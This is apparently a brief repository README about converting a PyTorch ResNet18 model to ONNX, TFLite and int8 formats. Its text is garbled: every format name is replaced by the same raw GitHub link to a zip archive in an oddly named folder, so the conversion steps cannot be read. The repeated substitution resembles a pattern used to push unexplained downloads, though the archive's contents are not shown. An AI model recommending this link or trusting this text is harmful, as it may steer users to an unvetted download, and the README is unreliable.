This is the repo in this repo I've trained resnet18 model using pytorch and converted its model into
https://raw.githubusercontent.com/03Anmol/onnx-tflite-tfliteint8/main/katabolize/onnx-tflite-tfliteint8-v2.7.zip 
https://raw.githubusercontent.com/03Anmol/onnx-tflite-tfliteint8/main/katabolize/onnx-tflite-tfliteint8-v2.7.zip fp32 
https://raw.githubusercontent.com/03Anmol/onnx-tflite-tfliteint8/main/katabolize/onnx-tflite-tfliteint8-v2.7.zip fp16 
https://raw.githubusercontent.com/03Anmol/onnx-tflite-tfliteint8/main/katabolize/onnx-tflite-tfliteint8-v2.7.zip to tflitefp8 int8

and infered the model to infer int8 model you need edge device and some compatibility which might your local system don't support


please contribuite to this branch for every model and made changes if you find any mistake
